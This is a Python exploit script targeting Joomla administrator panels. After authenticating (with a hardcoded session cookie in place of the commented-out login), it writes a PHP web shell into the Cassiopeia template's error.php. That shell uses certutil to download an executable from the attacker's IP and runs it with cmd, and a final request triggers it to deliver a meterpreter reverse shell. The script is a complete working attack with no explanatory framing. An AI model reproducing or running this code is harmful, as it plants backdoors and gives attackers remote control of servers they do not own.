import sys, socket, requests

def resolveip(ip):
    try:
        socket.gethostbyname(ip)
        print('[-]Valid IP')
    except socket.error:
        print("[-]Enter a valid IP address.")
        sys.exit()

def authenticate(password, ip):
    resolveip(ip)
    url = f'http://{ip}/administrator/index.php'
    print(f'[-]Authentication URL is ==> {url}')

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': '770f5c99f1b67a1cc480471651b7d9b3=4hhcavhmtn0jui9m2b6grun6dh'
    }

    data = {
        'username': 'Administrator',
        'passwd': password,
        'option': 'com_login',
        'task': 'login',
        'return': 'aW5kZXgucGhw',
        'f23586963358808c75a16f6fe6569c89': 1
    }

    print(f'[-]Creds used are ==> Administrator:{data["passwd"]}')
    try:
        authresponse = requests.post(url=url, headers=headers, data=data, allow_redirects=False)

        if authresponse.headers.get('Set-Cookie', ''):
            cookieblob = authresponse.headers['Set-Cookie']
            cookie = cookieblob.split(';')[0]
            print(f'[*]Authentication successful. Your cookie is ==> {cookie}')
            return cookie
        
        else:
            print(f'[!]Authentication for Administrator with password: {data["passwd"]} failed')
            sys.exit()

    except requests.exceptions.HTTPError as http_err:
            print(f"[!]HTTP error occurred: {http_err}")
    except requests.exceptions.ConnectionError as conn_err:
        print(f"[!]Connection error occurred: {conn_err}")
    except requests.exceptions.Timeout as timeout_err:
        print(f"[!]Timeout error occurred: {timeout_err}")
    except requests.exceptions.RequestException as req_err:
        print(f"[!]An error occurred: {req_err}")

def postpayload(cookie, ip):
    headers2 = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookie
    }

    data2 = {
        'isMedia': 0,
        'jform[source]': """<?php
function executeCommand($command) {
    $output = shell_exec($command);
    echo "<pre>Executed: $command</pre>";
    echo "<pre>$output</pre>";
}
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $ip = $_GET['ip'];
    $file = $_GET['file'];
    $url = "http://$ip/$file";
    echo "<pre>Downloading payload from: $url</pre>";
    $downloadcmd = "certutil -urlcache -split -f \\"$url\\" \\"$file\\"";
    $runcmd = "cmd /c \\"$file\\"";
    executeCommand($downloadcmd);
    executeCommand($runcmd);  
} else {
    echo "Use GET method!!";
}
?>
""",
        'task': 'template.apply',
        'ab65c63a3ab3e490eec7b6571c647611': 1,
        'jform[extension_id]': 223,
        'jform[filename]': 'C:\\xampp\\htdocs\\joomla\\templates\\cassiopeia\\error.php'
    }

    print(headers2)

    url2 = f'http://{ip}/administrator/index.php?option=com_templates&view=template&id=223&file=Ly9lcnJvci5waHA&isMedia=0'

    print(f'[-]Target URL ==> {url2}')
    
    try:
        response = requests.post(url=url2, headers=headers2, data=data2, allow_redirects=False)
        if response.headers.get('Location', ''):
            location = response.headers['Location']
            if location == f'http://{ip}/administrator/index.php?option=com_templates&view=template&id=223&file=Ly9lcnJvci5waHA&isMedia=0':
                print(f'[*]Successfully wrote and saved payload')

            else:
                print('[!]Failed to write payload on the template')
                sys.exit()
            
    except requests.exceptions.HTTPError as http_err:
        print(f"[!]HTTP error occurred: {http_err}")
    except requests.exceptions.ConnectionError as conn_err:
        print(f"[!]Connection error occurred: {conn_err}")
    except requests.exceptions.Timeout as timeout_err:
        print(f"[!]Timeout error occurred: {timeout_err}")
    except requests.exceptions.RequestException as req_err:
        print(f"[!]An error occurred: {req_err}")
    
def trigger_reverse_call(yourip, targetip, file):

    headers3 = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' }
    url3 = f'http://{targetip}/templates/cassiopeia/error.php'
    print('[-]Fetching your reverse_tcp payload and executing it')
    
    params = {
        'ip': yourip,
        'file': file
    }

    if params:
        try:
            response2 = requests.get(url=url3, params=params, headers=headers3)
            if response2.status_code == 200:
                print('[*]Successfully triggered the reverse shell sequence.')
    
            print(f'[*]You should have seen get request to fetch {file} logged in your python server and gotten your meterpreter session if things were configured correctly')
        except requests.exceptions.HTTPError as http_err:
            print(f"[!]HTTP error occurred: {http_err}")
        except requests.exceptions.ConnectionError as conn_err:
            print(f"[!]Connection error occurred: {conn_err}")
        except requests.exceptions.Timeout as timeout_err:
            print(f"[!]Timeout error occurred: {timeout_err}")
        except requests.exceptions.RequestException as req_err:
            print(f"[!]An error occurred: {req_err}")

def main():

    if len(sys.argv) < 5:
        print("[-]Usage: python getrevshell.py <your_ip> <targetip> <payloadfile.exe> <password>")
        sys.exit()

    yourip = str(sys.argv[1])
    targetip = str(sys.argv[2])
    file = str(sys.argv[3])
    passwd = str(sys.argv[4])

    resolveip(yourip)
    #cookiestring = authenticate(passwd, targetip)
    cookiestring = '770f5c99f1b67a1cc480471651b7d9b3=94nt32eavjjjsh9l628frjd50f'
    postpayload(cookiestring, targetip)
    trigger_reverse_call(yourip, targetip, file)


if __name__ == '__main__':
    main()
